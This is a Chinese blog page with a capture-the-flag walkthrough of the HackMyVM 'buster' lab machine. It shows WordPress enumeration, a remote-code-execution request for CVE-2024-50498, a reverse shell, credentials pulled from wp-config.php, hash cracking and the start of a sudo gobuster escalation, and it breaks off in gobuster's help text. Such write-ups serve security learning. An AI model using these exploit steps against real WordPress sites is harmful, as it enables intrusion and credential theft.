<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/w5CAf1BA6WXI2gBvWdfre/_buildManifest.js" defer=""></script><script src="/_next/static/w5CAf1BA6WXI2gBvWdfre/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMbuster","contentHtml":"\u003ch1\u003ebuster.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=buster\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=buster\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes: \u003cstrong\u003eWish you have fun.\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003enmap\u003c/code\u003e扫描，\u003ccode\u003e24\u003c/code\u003e是靶机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~]\n└─# nmap -sP 192.168.56.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 05:47 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00050s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00035s latency).\nMAC Address: 08:00:27:0F:6C:5D (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.24\nHost is up (0.00051s latency).\nMAC Address: 08:00:27:01:40:98 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.4\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (4 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 28.10 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~]\n└─# nmap -sT -min-rate 10000 -p- 192.168.56.24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 05:49 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.24\nHost is up (0.00086s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:01:40:98 (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到是搭建了\u003ccode\u003eWordPress6.7.1\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~]                                                                                                                                          \n└─# nmap -sT -A -T4 -O -p 22,80 192.168.56.24               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 05:50 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.24\nHost is up (0.00054s latency).\nPORT   STATE SERVICE VERSION  \n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)\n| ssh-hostkey:                    \n|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)                \n|   256 3e:1f:c9:eb:c0:6f:24:06:\u003cspan class=\"hljs-built_in\"\u003efc\u003c/span\u003e:52:5f:2f:1b:35:33:ec (ECDSA)\n|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)             \n80/tcp open  http    nginx 1.14.2\n|_http-title: bammmmuwe                                                       \n|_http-generator: WordPress 6.7.1      \n| http-robots.txt: 1 disallowed entry \n|_/wp-admin/\n|_http-server-header: nginx/1.14.2     \nMAC Address: 08:00:27:01:40:98 (Oracle VirtualBox virtual NIC)                \nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        \nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose                                                  \nRunning: Linux 4.X|5.X            \nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5               \nOS details: Linux 4.15 - 5.8                                                  \nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                       \n                                       \nTRACEROUTE                                                                    \nHOP RTT     ADDRESS                    \n1   0.54 ms 192.168.56.24\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~]                                                           \n└─# nmap -script=vuln -p 22,80 192.168.56.24\nNSE Timing: About 99.51% \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e; ETC: 05:53 (0:00:01 remaining)      \nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.24\nHost is up (0.00056s latency).                                                \n                                                                              \nPORT   STATE SERVICE                                                          \n22/tcp open  ssh                 \n80/tcp open  http      \n|_http-csrf: Couldn\u003cspan class=\"hljs-string\"\u003e't find any CSRF vulnerabilities.                          \n|_http-dombased-xss: Couldn'\u003c/span\u003et find any DOM based XSS.                         \n|_http-stored-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any stored XSS vulnerabilities.              \n| http-enum:                      \n|   /wp-login.php: Possible admin folder                      \n|   /wp-json: Possible admin folder                                                                                                                          \n|   /robots.txt: Robots file\n|   /readme.html: Wordpress version: 2                                        \n|   /: WordPress version: 6.7.1                                               \n|   /feed/: Wordpress version: 6.7.1\n|   /wp-includes/images/rss.png: Wordpress version 2.2 found.                 \n|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.\n|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.               \n|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.            \n|   /wp-login.php: Wordpress login page.                                      \n|   /wp-admin/upgrade.php: Wordpress login page.                              \n|   /readme.html: Interesting, a readme.                                      \n|_  /0/: Potentially interesting folder                                                                                                                      \nMAC Address: 08:00:27:01:40:98 (Oracle VirtualBox virtual NIC)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问主页，并查看指纹识别。和扫描的一样是\u003ccode\u003eWordPres6.7.1\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMbuster/image77.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看网站\u003ccode\u003erobots.txt\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eUser-agent: *\nDisallow: /wp-admin/\nAllow: /wp-admin/admin-ajax.php\n\nSitemap: http:/wp-sitemap.xml\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWPScan\u003c/h2\u003e\n\u003cp\u003e因为是\u003ccode\u003eWordPress\u003c/code\u003e，所以可以使用\u003ccode\u003eWPScan\u003c/code\u003e 来扫描（指定你的\u003ccode\u003eAPI token\u003c/code\u003e来扫描漏洞）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~]\n└─# wpscan --url 192.168.56.24 --api-token xxxxx -e u,ap\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫了快\u003ccode\u003e30\u003c/code\u003e分钟，才扫描完成，扫出了一个存在漏洞的插件\u003ccode\u003ewp-query-console\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e[+] wp-query-console\n | Location: http://192.168.56.118/wp-content/plugins/wp-query-console/\n | Latest Version: 1.0 (up to \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e)\n | Last Updated: 2018-03-16T16:03:00.000Z\n | Readme: http://192.168.56.118/wp-content/plugins/wp-query-console/README.txt\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://192.168.56.118/wp-content/plugins/wp-query-console/, status: 403\n |\n | [!] 1 vulnerability identified:\n |\n | [!] Title: WP Query Console \u0026#x3C;= 1.0 - Unauthenticated Remote Code Execution\n |     References:\n |      - https://wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50498\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3\n |\n | Version: 1.0 (80% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://192.168.56.118/wp-content/plugins/wp-query-console/README.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eCVE-2024-50498\u003c/h2\u003e\n\u003cp\u003e在\u003ccode\u003egithub\u003c/code\u003e上找到：\u003ca href=\"https://github.com/RandomRobbieBF/CVE-2024-50498\"\u003ehttps://github.com/RandomRobbieBF/CVE-2024-50498\u003c/a\u003e \u003ccode\u003ePOC\u003c/code\u003e 链接\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePOST /wp-json/wqc/v1/query HTTP/1.1\nHost: kubernetes.docker.internal\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console\nContent-Type: application/json\nContent-Length: 45\nOrigin: http://kubernetes.docker.internal\nConnection: keep-alive\nPriority: u=0\n\n{\u003cspan class=\"hljs-string\"\u003e\"queryArgs\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"phpinfo();\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"queryType\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"post\"\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMbuster/image78.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是打算执行系统命令时发现执行不了，\u003ccode\u003esystem\u003c/code\u003e和\u003ccode\u003eexec\u003c/code\u003e都使用不了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMbuster/image79.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可能是一些函数被禁用了，搜索一下**\u003ccode\u003e*disable_functions\u003c/code\u003e ,***一看好家伙禁得还不少，但是\u003ccode\u003eshell_exec\u003c/code\u003e还没禁用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMbuster/image80.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是执行命令没有回显\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMbuster/image81.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eping\u003c/code\u003e是可以成功接收到的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~]                                                                                                                                          \n└─# tcpdump icmp -i eth1                                                                                                                                     \ntcpdump: verbose output suppressed, use -v[v]... \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e full protocol decode                                                                                    \nlistening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes                                                                                 \n07:45:12.562498 IP 192.168.56.24 \u003e 192.168.56.4: ICMP \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e request, \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e 1669, \u003cspan class=\"hljs-built_in\"\u003eseq\u003c/span\u003e 63, length 64\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试反弹\u003ccode\u003eshell\u003c/code\u003e ，因为闭合问题不能使用\u003ccode\u003e/bin/bash\u003c/code\u003e弹，使用\u003ccode\u003enc\u003c/code\u003e也成功了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMbuster/image82.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~]\n└─# nc -lvp 4444\nlistening on [any] 4444 ...\n192.168.56.24: inverse host lookup failed: Host name lookup failure\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.24] 59298\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e靶机信息搜集\u003c/h2\u003e\n\u003cp\u003e存在\u003ccode\u003epython\u003c/code\u003e ，先获得好点的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython -c \u003cspan class=\"hljs-string\"\u003e\"import pty;pty.spawn('/bin/sh')\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在\u003ccode\u003ewp-config.php\u003c/code\u003e里面发现数据库账号密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/** Database username */                                                                                                                                     \ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_USER'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'll104567'\u003c/span\u003e );                                                                                                                             \n                                                                                                                                                             \n/** Database password */                                                      \ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_PASSWORD'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'thehandsomeguy'\u003c/span\u003e );\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查询\u003ccode\u003ewp_users\u003c/code\u003e数据库\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [wordpress]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from wp_users;\n\u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from wp_users;\n+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+\n| ID | user_login | user_pass                          | user_nicename | user_email        | user_url              | user_registered     | user_activation_key                           | user_status | display_name |\n+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+\n|  1 | ta0        | $P\u003cspan class=\"hljs-variable\"\u003e$BDDc71nM67DbOVN\u003c/span\u003e/U50WFGII6EF6.r. | ta0           | 2814928906@qq.com | http://192.168.31.181 | 2025-01-08 03:10:43 |                                               |           0 | ta0          |\n|  2 | welcome    | $P\u003cspan class=\"hljs-variable\"\u003e$BtP9ZghJTwDfSn1gKKc\u003c/span\u003e.k3mq4Vo.Ko/ | welcome       | 127.0.0.1@qq.com  |                       | 2025-01-08 04:29:28 | 1736310568:$P\u003cspan class=\"hljs-variable\"\u003e$B2YbhlDVF1XWIurbL11Pfoasb\u003c/span\u003e./0tD. |           0 | welcome      |\n+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将密码保存为\u003ccode\u003epass\u003c/code\u003e，如何使用\u003ccode\u003ejohn\u003c/code\u003e来破解，爆破出来了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~/Desktop/test/buster]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt pass \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])\nCost 1 (iteration count) is 8192 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\n104567           (?)     \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试\u003ccode\u003essh\u003c/code\u003e登陆成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~]\n└─# ssh welcome@192.168.56.24 -t bash\nwelcome@192.168.56.24\u003cspan class=\"hljs-string\"\u003e's password: \nwelcome@listen:~$ ls\nuser.txt\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进去后可以在当前目录找到\u003ccode\u003eUserFlag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\n29e0f786e8c90b3ce82e00de0ec7e7d3\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e查看权限，可以以\u003ccode\u003eroot\u003c/code\u003e身份执行\u003ccode\u003egobuster\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@listen:/$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e welcome on listen:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on listen:\n    (ALL) NOPASSWD: /usr/bin/gobuster\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看其权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@listen:/$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /usr/bin/gobuster\n-rwxr-xr-x 1 root root 4953296 Jun 13  2023 /usr/bin/gobuster\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e到这里就不懂了（雾），看了\u003ccode\u003ewriteup\u003c/code\u003e后发现可以利用\u003ccode\u003egobuster\u003c/code\u003e中的结果输出到指定文件即可\u003c/p\u003e\n\u003cp\u003e先看参数解释\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@listen:/tmp$ gobuster -h                                                                                                                             \nUsage of gobuster:\n  -P string                                                                   \n        Password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Basic Auth (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)\n  -U string                                                                   \n        Username \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Basic Auth (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)\n  -a string                     \n        Set the User-Agent string (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)\n  -c string\n        Cookies to use \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the requests (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)\n  -cn      \n        Show CNAME records (dns mode only, cannot be used with \u003cspan class=\"hljs-string\"\u003e'-i'\u003c/span\u003e option)\n  -e    Expanded mode, \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e full URLs\n  -f    Append a forward-slash to each directory request (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)      \n  -fw                                                                         \n        Force continued operation when wildcard found\n  -i    Show IP addresses (dns mode only)            \n  -k    Skip SSL certificate verification                                     \n  -l    Include the length of the body \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the output (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)\n  -m string          \n        Directory/File mode (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e) or DNS mode (dns) (default \u003cspan class=\"hljs-string\"\u003e\"dir\"\u003c/span\u003e)           \n  -n    Don\u003cspan class=\"hljs-string\"\u003e't print status codes                                              \n  -np                 \n        Don'\u003c/span\u003et display progress                                                \n  -o string                          \n        Output file to write results to (defaults to stdout)\n  -p string                                                                   \n        Proxy to use \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e requests [http(s)://host:port] (\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e mode only)       \n  -q    Don\u003cspan class=\"hljs-string\"\u003e't print the banner and other noise       \n  -r    Follow redirects      \n  -s string                                                                   \n        Positive status codes (dir mode only) (default \"200,204,301,302,307,403\")                                                                            \n  -t int          \n        Number of concurrent threads (default 10)                             \n  -to duration                                                                \n        HTTP Timeout in seconds (dir mode only) (default 10s)                 \n  -u string                                                                   \n        The target URL or Domain\n  -v    Verbose output (errors)                                               \n  -w string\n        Path to the wordlist                                                  \n  -x string\n        File extension(s) to search for (dir mode only)                                   